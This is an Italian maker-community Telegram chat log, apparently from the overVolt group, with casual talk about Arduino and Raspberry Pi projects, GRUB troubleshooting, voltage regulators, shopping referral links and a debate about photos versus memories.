È instagram, che ci vuoi fare
perchè hai censurato tutti tranne me? 
perché ti conoscono 
:shrug:
🤷‍♀️*
eh ci ho provato
ho visto che su TG Desktop se scrivi :shrug: lo sostituisce con la faccina in ascii 
¯\_(ツ)_/¯
Nope da me no
Devo tipo confermare
Tutte le emoji le faccio così io 
eh ma è l'alpha ancora
Tipo scrivo :joy
ma come fai 
E con invio metto la faccina

Questa è 
🤷‍♀️
ovviamente, se voglio ridere metto un 
Ahahaha a me va anche scrivendolo tutto hahahaahah
Ma è LINUUUUUUX
Non ti dico le figure di merda che ci ho fatto 

Tipo la scimmietta la metto con :see_no_evil
(non metto gli ultimi due : perché poi sostituisce)
Solo che è rapidissimo perché scrivo solo :see_ e la mette
Ho visto ora il tuo mess. Cmq ho fatto ,non funziona. Credo che potro andarci senza cmq
Che bello telegram night mode
Ormai lo uso solo così
Oh Raga, cosa ne pensate di Visuino? 
È un suino?
Si, lo visualizza in binario
Comunque sembra figo
🤣
È già disponibile?
si
costa pure poco
Lo proverò
licenza annuale 20 €
se non ti dimentichi, fammi sapere come ti trovi
Ma penso che userò il vecchio C perché per il progetto che sto facendo mi approccio meglio con C
Ah costa. Holy sheet.
ho cominciato a studiarlo..... una mega figata
Io neanche lo studio C
c'è anche la versione gratuita
Parto subito da Arduino C 
Senza conoscerlo
Ora tutti mi picchieranno
ottimo approccio, io sono malato e devo studiarlo
Geniale, ottimo per insegnare Arduino nelle scuole secondo me... ma ovviamente i linguaggi scritti sono meglio, sono molto più veloci
Conta che alla fine sono tutti simili i linguaggi e la logica dietro è la stessa, quindi fotte sega e programmo Arduino senza sapere C
Tanto c'è overVolt per i tutorial 
Concordo, ma per velocizzare progetti non sarebbe male, e poi editare il listato
Non ne ho bisogno
Mi bastano le doc delle lib
Da quanto l'ho conosciuto è stata una manna dal cielo....
mi ha spaccato la testa
nonostante la mia età
Comunque non posso non dire che mi ha insegnato ad accendere e spegnere un led!
era una pessima battuta? 
Penso di sì...
🤣🤣🤣🤣🤣 mi ha dato 20 anni meno sulle spalle
-_- ti banno che è meglio 
Comunque la mia era più bella
^

Comunque io ho delle grandi lacune di elettronica
pensa che non ne ho mai fatto, mi aiutano solo vecchi concetti di Fisica2
Per questo non sarò mai in grado di fare roba con circuiti maggici usando i capacicosi e diodi
Magari imparerò
Seguo un ragazzino che pubblica video sui componenti elettronici
nulla è impossibile quando c'è passione
Quest'estate prevedo sfondamenti cerebrali con Arduino
Anche da mobile
la voglia di cambiare ti fa ritornare con la mente di spugna come quella di un bambino
Cambiare cosa
Vero, io sulle cose che mi interessano imparo subito
....mi sta venendo la pazzia di reiscrivermi all'università 
Tutta colpda di overVolt 
  
Hahahahahahaha
oooh
meglio, vuol dire che hai ancora voglia di imparare
quindi non sei un giovanotto
La mia prima console giochi Video Pack Philips, a cartucce 🤣 vediti qualche foto, poi Commodore 64, con Drive 1541 II 🤣 olivetti M24 con MS-Dos Pirmordiale e poi Olivetti M240 ( Nel mentre SEGA MEga Drive a 16 bit)..... 386, 486, 586, Pentium MMX 🤣🤣🤣🤣🤣 ho perso il conto
dimenticavo il Windows 2.1 🤦‍♂️
tra gli amici, chi aveva il Vic 20, o il Commodore 16, Commodore 128, Atari ecc..... erano i giochi degli anni 80
capito
e chi si divertiva a creare in basic la mongolofiera e farla volare su un monitor a fosfori verdi
Giornata Mondiale delle Api indetta dall'Onu il 20 maggio - Animali - 


seeee
viva le api
qualcuno di voi ha mai registrato prodotti msi comprati da amazon?
Ormai internet funziona grazie a quelle
Eh si ma da mobile è scomodo
No, non lo fa
Se hai oreo e hai attivato i permessi sì
È una delle feature che i produttori non possono disabilitare
Infatti è attiva
Permessi di root?
Non servono
Permessi dell'App
Chrome deve avere il permesso di mostrare cose in PiP
Secondo voi funzionerà?
ehm...
Quando l'ho vista ho riso un quarto  d'ora
Ahahahahaahahahah
sapete come riprodurre contenuti sulla chromecast da un server DLNA?
satto
Qualcuno di voi utilizza Adobe ae?
Devo sintonizzare una voce al suono del sax (Epic sax guy) e come suona veloce non riesco, c'è un modo per rallentare tutto il progetto e poi mandarlo veloce o di sincronizzarlo automaticamente?
Ma il cluster è un tipo di supercomputer?
Io credo nella fate, lo giuro lo giuro
Non mi funziona!
Ragazzi ho il pip abilitato e nel YT deve funzionare,ma non va lo stesso :(
È possibile minare per svago con solo la CPU del raspberry (magari né posso utilizzare più di uno )?...Quanti centesimi posso ricavare?
...premessa il raspberry è già collegato a un impianto solare...
Un centesimo annuo se hai culo
 se mi dicevi 5€
 ero già contenuto
Con 5000 raspberry, forse

E come dovrei fare esattamente? Prendo una resistenza a caso e la saldo su un cavo? E poi che voltaggio mi manda?
Ma dalla 220v?
Emh si calcola....
e poi ci sono io che ho fatto 1 euro in 2 mesi
Cmq lol ho fatto le stesse cose che dicono nel YT,anche per nokia 6.... non funziona e basta eppure ho pip abilitato
Siii esiste speranza...come hai fatto
Usa un regolatore di tensione(7812 o un convertitore dc-dc)...la resistenza dissiperebbe troppa potenza
Veramente avete provato a minare con il lamponcino
Step down
Già da 19 a ...12v-6v
Vabbe si che scemo, la cosa bella è che l'ho pure studiate
Quanto assorbe il motore ?
Oppure step up
Step up ---> xl6009
Step down ---> lm2596
Portano circa 3 A in uscita
Ma io non li utilizzerei per valori superiori a 1.5A
Sono regolabili mediante un piccolo trimmer
Una volta regolato gli metti una puntina di colla per bloccare la vite... saldi i cavetti e chiudi tutto con guaina termorestringente. ... e il lavoro e fatto... dovrebbe entrare nella guaina con diametro 22
Bytecoin... parecchio facili da minare 
E quanto si guadagna?
Cosa metto qui?
poco, l'ho fatto solo per sfizio
L RC è a 5.8Ghz 🤣
Lo voglio fare anche io per sfizio ...hai una guida per me?
ti linko quella che ho seguito, quando non sapevo nulla di cripto
se la trovo
Come risolvo?
Ah grazie... deve essere divertente
Chi ti dà questo errore?
VirtualBox?
con cosa?
bytecoin
Grazie
occhio, cambia pool, perchè Minergate ti ruba tantissima potenza
?
Ragazzi ma con i sonoff se "salta" la corrente dunque non passa più corrente e il sonoff si spegne...si deve riprogrammare dopo
?
Il lamponcino e una potenza!!!
Lo utilizzero' nel progetto di una nuova robotcar con videocamera
Ora dà questo
Cosa
Sapete come eliminare il grub che devo togliere Ubuntu?
Uefi o grub?
Grub
Eh ma usi legacy bios o uefi?
Il primo
a me non appare più GRUB
Io lo odio
Ce se elimino le partizioni di sistema dovrebbe levarsi dal cazzo, e invece no
E il grub rescue è un terminale di merda
Come si connette il raspberry al wifi con un ip statico?
VirtualBox
Non hai caricato nessun sistema operativo
Se lo carico da questo
.
Ti prego, non iniziare con Kali
Perché no?
Vuoi fare l'akerino?
No voglio vedere come possono entrarmi nel sistema e provare a fixare
Ciò presuppone che io impari ad utilizzare metasploit e non avendo il rasp con me non posso esercitarmi
 come lo faccio funzionare?
wtf?
inizia con il tostapane
HAHAAAHAAHAAAAHHAAHAHA i cestini
a parte quelli, guarda la cosa di winzozz
i carattero
Guarda cosa mi tocca fare per farvi i video...

ma cos
ma perchè
cosa??
Why?
Per un video in collaborazione con MoreThanTech
ma....
Gameplay o qualcosa di speciale?
Speciale, gameplay mi rifiuto
Ah ecco
forza e coraggio
E capirete anche perché sul mio canale, appena vedrete il titolo 
avevo installato bubuntu ma ora non c'è più grub, come faccio a sapere quali partizioni usa ubuntu per eliminarle?

non potevi fare csgo o cod?
comunque, qualche volta ci facciamo una partita 
Ah il fatto che sia fortnite invece di altro è solo per il clickbait in realtà 
ah... 
Inserisci una Backdoor nell'installer?
inoltre overvolt esiste già 
addirittura 
chiamati MarcoRomboli
Però è bravo
best nome ever
ma con lui non avevi fatto anche cs go?
Macché, quella era una live a caso con 
 che poi ho pure eliminato
ah, shish
comunque... esci il nickname così ti chiediamo l'amicizia 
overVoltOfficial, come youtube dove non potevo prendere overvolt, come facebook e instagram dove overvolt era già preso, e come patreon dove ho messo official sennò sarebbe stato l'unico diverso
woow
Ma ti assicuro che fatto il video lo disinstallo 

io ci faccio giocare i miei fratelli
hai proprio una graaandeee fortuna con i nickname
Eh ormai li faccio tutti uguali
ma almeno toglila
visto che marco ha tolto il messaggio
no 
la mano è la nostra padrona
e noi dobbiamo obbedirle
beh, solo link referral?
deve diventare ricco ? 
scherzo 
 ovviamente
wooow
mano sono 613
te non conti
614 bufu
612

anche se te hai la catena
quindi...

ma ti diverti?
marco sta scrivendo,,,, e poi invia il messaggio il bot
è costretta a lavorare 24/7
hahahahahaha
ho trovato un bug nel bottttttttttttttttttttt
Che bot
la mano
presumo
A
ti sei cagato in mano no? 
Ah
Ah
Ah

Raga ho un dilemma come al solito: ho un pc che voglio monopolizzare, ci sono dei documenti di mio padre, dunque vorrei spostarli tutti sul vecchio pc e quel pc piallarlo (è stato riempito di merda che manco le oche per il patè sono così piene) e farlo diventare mio... dunque come faccio a passare tutto quello che c'è su sul vecchio pc?
Scambi gli hdd 
Se ti serve tutto tutto fai un backup e via no?
Sul nuovo c'è un terello e sull'altro un 750 mmm
Un back-up come viene salvato su Windows 10?
Beh scherzavo in ogni caso, non penso sia la soluzione migliore.
Prendi la roba che non ti serve e la sposti con un HDD esterno da un pc all'altro..
+
Semplice copia incolla
Non ne ho uno di appoggio
Puoi usare un'applicazione di rete per spostare la roba da un pc all'altro..
Un'applicazione di rete, mmm interessante
L'ho comprato un po' di mesi fa ma manca la canapa. Infami.


 ‎€2‎2.‎65‎ i‎nv‎ec‎e ‎ch‎e ‎€4‎2.‎90
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎7.‎20%
⭐️‎ 4‎.7‎0 ‌‎/‌‎ ‎5.‎00‎ (‎17‎ r‎ec‎en‎si‎on‎i)
✂ 
: 

 Store: Banggood

 Monitora la composizione del terreno, l'irrigazione e la luce solare e si illumina di conseguenza!
 Database con 900 specie di piante per trattare ciascuna secondo le esigenze!
 La batteria dura 2 mesi senza alimentazione!

 

Drive e via, almeno il backup è quasi eterno
Eh ma 15gb
Anche se potrei usare quello dell'uni
Se hai la scuola associata puoi avere quello illimitato
Ecco
Buonasera ragazzi consigli su manuali arduino per principianti ma conpleti
Passa da 
Ok grazie
Nel database? Hahahahahha
Sì. Maledetti. Utilizzo una pianta con caratteristiche simili.
La canapa dovrebbe funzionare
Serial è la seriale USB per la comunicazione con arduino?
No
Comunicazione seriale in generale
Ecco perché non funzionava a seriale di arduino 
Ragaz per "puro scopo informativo" qualcuno ha creato un 433 jammer?
Raga, sto utilizzando l'hotspot del telefono per ascoltare musica da Spotify per PC, non si sta surriscaldando per niente 
Nè tanto meno scaricando velocemente
dovrebbe surriscaldarsi il cellulare?
beh di solito brucia
Per i Dati Mobili
E Spotify non perde qualità nel mentre
almeno, l's7 resta fresco, tutti i telefoni da 200 euro da poveri cinesi che io abbia mai avuto sembravano note 7 in carica
I redmi non scaldano
Mi sento tirato in causa ahahah

 ‎€1‎6.‎99‎ i‎nv‎ec‎e ‎ch‎e ‎€2‎5.‎74
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎4.‎00%
⭐️‎ 4‎.8‎7 ‌‎/‌‎ ‎5.‎00‎ (‎33‎16‎ r‎ec‎en‎si‎on‎i)
 Store: Gearbest
 

In realtà era 
 anche se penso le abbia già comprate 
Anche io avevo chiesto per delle cuffie un po' di tempo fa ahahah
Che ho fatto? 
Eh ma che cazzo, io le ho comprate a 26 cristo!
Ma sì ha scritto un nome a cazzo 
Si, le ho prese , almeno hai ricevuto i soldi di 43€ di spesa su Amazon?
Ahahahahahah
Sera Raga
Sera
Benvenuto!
Raga.. sto per farmi un nuovo laboratorio... Mi serve qualcosa per rivestire il pavimento che costa poco... Ora c'è cemento... Cosa mi consigliate di economico ma duraturo?
Altro cemento?
Plastica
PVC?
Nah
prosciutto?
Poi me lo mangio quello non dura molto
mhh... 🤔
hai ragione
Io pensavo tipo il lynoleum 🤔
Non so cosa sia 
Tipo una pellicola spessa di pvc
Allora ci sta
Ma il lynoleum e un finto legno
Allora sbaglio nome 
No aspetta il pavimento il vinile
Ecco
La plastica non è il massimo della bellezza ma è funzionale
Con i dischi impressi sopra 
Quello a bolle 
Ci sta, è nero passi uno straccio ed è come nuovo
Non so come vada posato, se con siliconi strani o se ci voglia uno strato impermeabilizzante tra il suolo e il pvc
Ce lo poso diretto e ci poso sopra scrivania e resto
Il problema è il costo
Il fatto è tra il suolo e il pvc passa di tutto, tra cui aria e acqua...se ti si fa la muffa poi è uno schifo
Uhm vero
Adesso vedo
Beh, non saprei il prezzo alla fine è quello...prova a vedere un po' in giro
Vedi qualche tutorial
Se no vado a rubare le resine per i pavimenti e mi faccio il pavimento in resina 
Lool
Ma io avevo da qualche parte un rotolo di rivestimento per pavimenti 🤔🤔
Qualcuno può suggerirmi delle mobo per AMD che supportino gli m.2 e le ram ad alta frequenza?
Ah beh, di queste 600 persone difficilmente qualcuno sa dove è finito 
Scommetto che ha applicato il referral di Overvolt 
Hahaha niente è finito 
Loool

Salve a tutti
Samuraileon
Che stai registrando?
e soprattutto shorta i link, tenendo più pulita la chat ☺️
Ah 
Quello è il costo, difficile trovare di meglio....io preferisco il parquet 
Che tipo? (X370, B/AB350...)?
Pavimento in PVC con le bolle. Mio padre fa i granuli dei campi da calcio in PVC
Vediamo cosa riesco a procurarmi
Pavimento in pvc con tappeto isolante sotto (di solito lo vendono proprio insieme)
È la cosa migliore
Bella prova
Vai di resina.
Ci ho fatto i garage ed è qualcosa di fantastico. Si pulisce perfettamente, ignifuga, molto resistente ecc..
Ragaz?
b
Questa?
U sure? 
B entrambe
Vertici di un triangolo
La a
Perché sono allineati
Yes
Non ho capito cosa intendi per tipo
Che processore devi metterci e qual è il budget per la mobo?
Un ryzen 5 2400g è per il budget sotto ai 100€
Troppe componenti da ricconi
ragazzi
qualcuno che ci sa fare con fl studio mi può scrivere in direct?
Verrebbe bloccato in dogana? Mi conviene per 20€ in più prenderlo da Amazon? C'è di meglio allo stesso prezzo che vada bene come questo?
 che ne dici?
A parer mio, se devi spendere tutti questi soldi, prendi su Amazon che almeno hai la garanzia
Fosse 100 euro di risparmio
Ho visto che va forte. Per montare la roba per l'fpv della sua marca?
Basta montare la camera e mettere l'antenna e trovare il canale  sullo schermo?
Non lo hanno anche su Banggood?
Si
Lì la dogana la eviti sicuro (a meno che non prendi DHL o corrieri da ricchi)
Cosa ti serve?
un paio di consigli, sono parecchio scarso
 entra qui, fai prima
(spam temporaneo, sorry)
[puff, sparito]
Che cosa e'?????
un gruppo di producer, circa
non entrare se non produci, è inutile 
Cosa bisogna produrre?
musica
Ok... non mi interessa tanto... solo per l'elettronica
ma cosa... serio? 


che poi, se clicchi è come se avessi scritto
Adesso vi banna per spam
Se invece negli ultimi quattro mesi avete scritto almeno un messaggio non serve 
fissa questo, và 
Giusto per sicurezza
Un messaggio meglio che lo mando

Modificato
Mi consigliate un programma gratuito di video editing
Nel dubbio? Scrivo ora e mi tolgo il pensiero xD
Hitfilm
Con cosa controlli i motori?
Ho caricato il nuovo software per la gestione del sensore a ultrasuoni
Idem
Ora passo all'autotracking
Ho quasi impiegato tutti i pin di arduino...
da vinci resolve
Grazie
Che era?
Come uso il referreal?
Grazie mano
Concordo con HitFilm, molto funzionale e bello.
È molto simile a premiere
Utilizzero' uno step down per alimentare i 5 sensori di rilevamento linea
E ho anche la garanzia?
Garanzia di tutti i cinesi... Se non arriva o se arriva rotto te lo rimandano, ma una volta che ce l'hai poi ti arrangi
Capito
Per risparmiare ho visto che su Amazon da solo con prime arriva lo stesso di un altra marca + radiocomando
Posso prendere anche camera e schermo separato?
Per risparmiare
Con Amazon se hai un problema dopo un anno e mezzo te lo cambiano, i cinesi no
Penso di sì
Col referral vero? 
Intendo di altra marca comunque perché su Amazon c'è solo drone e radiocomando e poi schermo e camera con un affarone plasticoso dove ficcare lo schermo
Oddio, il cervello è in conflitto
 Il referreal va messo ad ogni articolo?
Ho già un amico con cui lavoro che lo ha 
Ad ogni ordine
Il drone funziona anche con camera e schermo non di marca sua?
Come lo metto all'ordine? 
Circa
Come circa?
Tanto scotch 
Ha smesso di funzionare?
Ad un prodotto dell'ordine, intendo
Nono poveretto, funziona
Non è bellissimo però
Ah ok
Più che altro ho visto che la sua camera ha un antenna
Non è incorporata
Se prendo camera e schermo di altra marca, magari entrambi della stessa, dovrebbe andare, no?
Ti dico, io gli ho attaccato una gopro davanti con lo scotch da pacchi e una fotocamerina FPV nel muso col trasmettitore legato sotto al drone
Si può verificare se funzia il referreal o faccio l'ordine e chi si è visto si è visto?
La seconda purtroppo
Ma di solito funziona
Ma se riapro l'articolo non me lo segna nella barra degli url, è normale?
Cosa?
Il referreal
Ah sisi dovresti vederlo
Grazie mano
Non funziona
 aridaje
 è ancora rotta
Grazie
la mano creata da Marco che si arrabbia con Marco perchè ha usato un referral non di Marco
Si guarda 
Che dite, una decina di ampere ci passano per questa linea o prende fuoco tutto? 
Passeranno
sarà almeno da 12A
Prova
male che vada chiamiamo i vvf
Chiama 
 in caso
satto
Forse ti conviene stagnarla tutta... almeno non si ossida
Eh un attimo
Beh fai conto che è 2,5mm quel coso
Ce ne passano pure 16
Per 3 MOSFET è anche troppo...
Mica sono solo quei 3 MOSFET
Ci devo fare molte cose con quel coso
Non era la scheda per i led ?
Non solo
Ne approfitto e ci metto anche il circuito per pilotare i LED visto che l'ho fuso a febbraio
E sì, giusto ora che sto a casa con la broncopolmonite a fare un cazzo ho tempo per sistemarlo
Però a quanto so i fumi del saldatore fanno male alla polmonite
Sicuramente...
Usa un po' di flussante come areosol
E per la prima volta nella mia vita non userò un Raspberry
Che se mi conoscete sapete che ne abuso, li uso anche dove non servirebbe manco un Arduino
Hahhaha vabbè...
Mi è arrivato venerdì e volevo provarlo
esp8266
Quindi userò lui
Hahahahhahaha
Yes, è un ESP-12E
ook
raga oggi faccio un mega resolve di tutti i problemi che mi sto trascinando: qualcuno che se ne intende di fotografia? (in particolare mi serve per una macchina nikon)
Ha un processore 80Mhz, il Raspberry ha 1Ghz
Stiamo lì dai, ha solo meno di 1/10 delle prestazioni
Conoscete una scheda con il costo simile a raspberry?? E con la cpu più potente?
orange pi
dimmi
Intel Galileo
Però è enorme

in privata, almeno non scassiamo troppo il pene

Cioè, non so quanto sia più potente ma ha un Intel Pentium x86
Si a CPU va a 400Mhz
io ne sto facendo passare 30 in una cosetta un pelo più grossa di quella e non mi è ancora esploso nulla in mano, fai te
voldendo ti calcolo se il cavo è a norma per l'amperaggio che ci vuoi far passare 
Su banggood lo hanno come voglio io (senza plasticone dove metterci lo schermo per far finta di avere quello fpv) a 150€, normalmente quanto impiegherebbe ad arrivare?
Ma chissene frega della norma
L'importante è che non esplode mentre dormo
E soprattutto che non esplode come il circuito di febbraio
la norma è fatta proprio per questo 
Che per qualche ragione sconosciuta ha deciso di caricare un pin dell'Arduino con una decina di ampere
Ma è a norma, è un cavo da 2,5mm di quelli che si usano per le prese spellato, ci passeranno 
non è a norma perché non è opportunamente isolato 
Un 3-4 settimane
1 mese in pratica
Quanto ci ha messo e dove l’hai presa?
Più di un mese, Banggood
Ma lo devo mettere sull'armadio
tornando seri, se il cavo non è opportunamente isolato potrebbe spostarsi e fare un bel corto bruciandoti qualcosa
Ragazzi
Mi hanno regalato questo hotend
Non capisco però che modello sia
Qualcuno lo conosce?
Ma se lo stagno come fa a spostarsi
è ancorato per tutta la sua lunghezza?
Sì
allora no problem (a meno che non ci siano altri conduttori liberi di muoversi non isolati)
Cos?
Ma rega, ma è possibile che un pc mi sia durato un giorno?
 cosa gli hai combinato

Niente è questo il problema
È freezato con un solo led, manco fosse un mips32
anche riavviando?
*spegnendo accendendo
Se premo il power button il led della lampadina si spegne, ma poi si riaccende subito dopo averlo rilasciato
provato a cavare la batteria
Non parte niente, ne ventola ne hard disk nulla
Il costo?
È integrata
Modello?
F555D
Asus
fare reso/mandarlo in rma
Eh ha la garanzia di un anno avra un annetto emmezzo
Ah
a meno che non compri con fattura aziendale è 2 anni per legge
Avevi detto che era durato un giorno
Dove l’hai presocratica
Preso
Che devi fare con 10A
12 mesi preso con i soldi docento
Eh l'ho preso in mano ieri
Da che negozio l’hai preso?
Amazon?
sicuro che siano 12
Non lo so
Non mi importa, voglio solo utilizzare il mio pc
Non sai dove l’hai preso?
Amazon
Allora se chiami e dici che l’hai iniziato ad utilizzare adesso ti fanno il reso
prova a scrivergli
Stessa cosa è successa a me
Solo con una soundbar
Chiama
Che palle
ni perché avendolo preso con il bonus docenti teoricamente vale come aggiornamento professionale e quindi la garanzia è 12 mesi e non 24 e quindi sarebbe scaduta ma in questi casi la cosa migliore è chiamare o chiedere
Chiama prima ASUS
Ma non posso aspettare 7 giorni
Andatoooo❤️❤️❤️
Anche se ho dovuto smontarlo e staccare la batteria
Per una bobina di tesla il filo di rame di 0.1 mm va bene?
Yeeeeeee
Vi amo
Di dove sei? Se sei in zona ti giro il contatto di chi ha fatto il lavoro che sicuramente può darti un'indicazione più precisa dei costi
Vicenza
Te quanto hai speso al mq?
14.50+iva
Okk
Adesso vedo che devo fare una stima dei mq da fare
Sarebbe sto spazio qua quindi sui 13x4m
757,19€ spendi
Ella madò 
Desso vedo... Magari se do una pulita profonda lascio anche il cemento se messo bene
figata, non ho avuto il tempo di provarlo, facci sapere sono curioso
ma è un wemos?
No, è montato su una scheda NodeMCU
La differenza tra il wemos è che ha più pin
link?
Non ce l'ho 
Banggood -> NodeMCU
Ma il prezzo cambia molto in base a materiale, spessore finito, fondo che hai
Fondo cemento intorno 
Raga come si fa ad installare un grub manualmente?

Praticamente ho installato elementaryOS su una partizione non di Windows ma non viene installato il grub per poter cambiare di sistema operativo. Avete idee?
500!!!!!
  
Grazie
Miiiii, che strage!
ciao
Ciao a tutti!
?????
sudo apt install grub2
Mi raccomando non spoilerate
Ma non posso accedere a ElementaryOS
Ho solo Windows
avvia la live e lo installi sulla live
HAHAHAHAAHAAHA 
Benvenuti a tutti i nuovi!
Ciaoooooo
wao
era troppo quieto questo gruppo

benvenuto!
Esatto
Grazie
prego 
perché?
Ma qua si può parlare anche della serie di hacking?
Falliti dc
Ciao a tutti!
Ciaoo
Qua si può parlare bene o male di tutto, senza sfociare troppo nell'illegalità e cercando di rispettare tutti
Ah ok grazie
Se no i moderatori vi fanno il cul
Perché c’era una passaggio che non capivo
Devo hackerare la banca mi date una mano ?
Niente blasfemie, te lo sei scordato
Giusto
Ecco
Anche qui?
Dio mio
Penso che questo sia stato il warn più veloce della storia di questo gruppo
Comunque nel blog di overvolt ho visto l’ultimo episodio di hacking e il primo passaggio non mi viene perché mi dice che non esiste il template
Ma dove hanno sponsorizzato questo gruppo?
Sul canale
Sul canale di overVolt
sul canale overvolt
 evita ahahahahahh
È il momento di pubblicarvi il link al gruppo Telegram! Se volete ci trovate su 
, il gruppo dei makers italiani!
I'm Flash, bro 
meglio, eravamo tornati a 490 
Meglio da un lato ma dall’altro no 
La cosa sta degenerando
C--n't is way worsen't than C++



by 

n't everywhere++
 dopo ti dico una cosa in privato
Benvenuti a tutti, comunque!
scanfn't e excluden't però fanno morire 
*pubblicon't
yesn't
In wat langege are spiking
So britishhhhh
italian't*
ODDIO
Oh, mien what do you sayd
chi se lo ricorda? 
Hahahahah faccio fatica a scrivere cosi
Io.
non conosci il meme?
No,
Tell me
ouou non spammare troppissimo 
E niente, volevo iniziare un nuovo progetto ma mi son già rotto dopo aver scritto <html></html>
Strano, non sei stato segnalato per spam
entra su ProgrammerJokes o ProgrammerHumor
why?
boh, mi è passata la voglia ahah
Ho l'antiflood biologico
Uh, orto biodinamico
come me con gli flp
Come posso fare un sensore di "apertura della porta" con arduino?
Che bello sono nel gruppo di overvolt !!!!
Il bot per il regolamento non mi funziona premendo sul referall
Anche a voi 
?
Ecco qua
Grazie
esistono i sensori di schiacciamento:
Costano tanto?
Ciaaaaooo
costano pochissimo, ma non riesco a ricordarmi il loro nome preciso per farti vedere la foto 
ciao!
Yyeee mi hai salutatoo
Mi comprerò il Pc con il link referrato di Amazon
this 
Ma come lo monto in una porta scusa?
nella cornice, se la porta é chiusa quello viene premuto
basta fare un buchino nel legno
È di mia nonna la porta
ah, niente
2.50$ su Gearbest
usa un sensore di prossimità p u  laser
O col sensore di campo magnetico
Non ne vale la pena
Questi?
Se hai uno starter kit Arduino fai prima ad usare i sensori a infrarossi
Sì ma sarebbero poco comodi, come li useresti?

Ciao ragazzi, come 
 ha detto in vari video, presto sarà emesso il regolamento europeo sui droni che andrà a sostituire quello italiano dell'enac. Per raccogliere i giudizi dei cittadini europei sui droni è stato pubblicato questo questionario. Se la questione vi interessa potreste provare a compilarlo.
yes
Ne esistono di più piccoli
È giusto per uno scherzo, non deve essere definitivo
Ma li metti nel muro di fronte? Oppure incassati nella "parte che verrà coperta dalla porta"?
No vabbe è per confrontarmi perché devo fare anch'io una cosa del genere
Dietro la porta attaccati con lo scotch al muro
Ok non funziona: ho fatto l'installazione del grub dalla live però quando finisce l'installazione e premo su "riavvia ora" parte Windows
Che belli...
Io ho fatto il radar sul computer con arduino
Sai, non li ho mai usati...
Io si l'ultrasuono per quanto possa essere complicato e seplicissimo sia da capire che da utilizzare
Se lo metti su un servo puoi fare il radar
L'infrarosso può vedere più lontano e con più chiarezza ma ha dei limiti... lo devi tarare su una distanza... l'ultrasuoni (almeno hc-sr04) ha una distanza di rilevazione bassa intorno ai 50 cm e con i corpi inclinati si 45 gradi da I numeri... quindi devi fare l'agoritmo che prende più valori per determinare se l'ostacolo r vero o no...
Ti faccio vedere i video
Usa una ampolla Reed
Hai installato il grub2?
Costa pochi centesimi
Le vendono anche al Bricoman...se lo hai vicino casa...
Compra un kit robotcar. .. io ho la osoyoo... impari subito e in un mesetto hai una buona panoramica di quello che questi sensori possono fare
Se è quello che dico io ce l'ho già
Yess
Però quando riavvio, i file messi sulla live vengono cancellati quindi disinstalla anche il grub
Buona sera a tutti!
Quale Windows hai!
Basta che installi sull’hard disk
10
Home
Ot
Ho preso 8 a latinooo
BRAVOHHHHHHHHHHHH
Ehhh
Complimenti
Non mi rimandaaaa
Hai notebook?
Si è uno portatile HP
Quando torno a casa ci do un'occhiata e in caso lo metto sul canale
Parliamone
Nono adesso spiegami... Com'è che a te funziona?
Mah non lo so
Ah sembra lo abbiano riacceso

Salve signor White. Come va con Gus?
 io non sono assolutamente d'accordo con quello che dice nel video 
Che senso ha avere un ricordo se non lo si ha neanche veramente vissuto? 🤔
Mmh ma veramente non l'hanno vissuto gli altri?
Poi per le lettere sono parzialmente d'accordo, certo che lui ha proprio banalizzato il discorso...
Certo è il messaggio che si vuole mandare che conta, però conta anche un po' lo stile con cui lo si dice e certamente scriverlo in una lettera gli dà un'importanza in più. Diamo valore alle lettere semplicemente perché non ne scriviamo milioni al giorno come i messaggi. Un messaggio importante si perderebbe semplicemente con i tantissimi altri che scriviamo. Poi in realtà capisco quello che vuole dire e non posso negare che è meglio scrivere un bel messaggio piuttosto che scrivere una lettera senza senso
credo dipenda più dalla persona, tipo a me secca mettermi a fare foto, quindi di solito non uso il telefono più che molto, comunque per la parte delle lettere sono daccordo, soprattutto contato che siamo in italia e qua abbiamo 

Diciamo che il papa sarà passato per pochi secondi e sicuramente se lo sarebbero dovuto godere a pieno invece di perdere attimi per una foto..
Mmmh in realtà nella questione quantità non sono troppo d'accordo
Non vedo perché dovrebbe dare importanza 🤔
Beh può dipendere da persona a persona, un messaggio puo avere anche un valore molto grande. Però oggettivamente non cambia molto, ecco..
Infatti sono comunque parzialmente d'accordo con lui in questa parte
Si sono d'accordo in realtà: dipende un sacco da persona a persona. Io ad esempio sono uno che deve documentare questi momenti, altro che vecchina 
Io comunque la vivo, la situazione in cui sono... e anzi il processo creativo del pensare e fare una foto (o un video, o un qualsiasi ricordo... Ci sono quelli che si mettono a disegnare i paesaggi a carboncino) secondo me fa riflettere quel minimo in più che aiuta a fissare il momento.
Ad esempio i vlog dell'estate scorsa, cicca mi avrà odiato ma io sono contentissimo di averli fatti perché tra il girarli al momento, il montaggio, la scelta delle musiche e anche il fatto di possederli anni dopo... Boh, avrei dimenticato il 99% altrimenti 
Idem per la questione carta/messaggio lettera/emoji... Se puoi veicolare lo stesso messaggio in un modo che in quella situazione senti essere migliore perché no? 
Boh poi questo vale per me, eh, comunque sono anche di parte perché fangirlo troppo coi video di GaryVee 
se guardi gli ha scritto lo 
 alle 14 e gli ha risposto adesso
Sulla parte dei video e delle foto come ricordo sono d'accordo... il problema non sono quelli come te che si interessano a fare foto/video, ragionando magari sull'inquadratura, sull'angolazione, sul fuoco, i soggetti, le luci eccetera, il problema è la gente che é continuamente a scattare foto con il telefono, non per passione di fare foto ma solo per postarle dappertutto. Lì sì che ti perdi i momenti, non ti assapori nulla perchè stai pensando al filtro da mettere per ricevere più like.
Quando invece scatti una foto per passione, stai attento al paesaggio e a tutto il resto, che è una cosa completamente diversa secondo me.
Eh ma anche lì, come fai ad essere sicuro che quelli non stiano vivendo il momento... Chi sono io per dire che come lo sta vivendo quella persona vale meno di come l'ho vissuto io o di come l'ha vissuto la vecchina? 🤔
beh, certe persone le vedi. Saró io che sono più ggiovane e quindi vedo molte ragazze della mia età, ma sono praticamente tutte infognatissime coi social, magari si perdono dei momenti bellissimi solo per fare qualcos'altro col telefono. Ma questo non c'entra molto col video
Per la questione della lettera, sinceramente scrivere una lettera è più "impegnativo" e "rompipalle" se vogliamo, ecco perché viene apprezzata (secondo me giustamente) di più
Quindi non sono completamente d'accordo sulla questione del "il messaggio è importante non il media"
Benvenuta!
comunque, non che c'entri molto ma anche Vsauce ha fatto un video proprio riguardo a "la mia esperienza personale è diversa dalla tua".
Usa i colori come esempio, ma secondo me si può andare più a fondo in quel video... moolto strano, a pensarci
Link: 

Salve
Vsauce 
Perchè vsauce ha mai fatto nulla che non fosse strano?
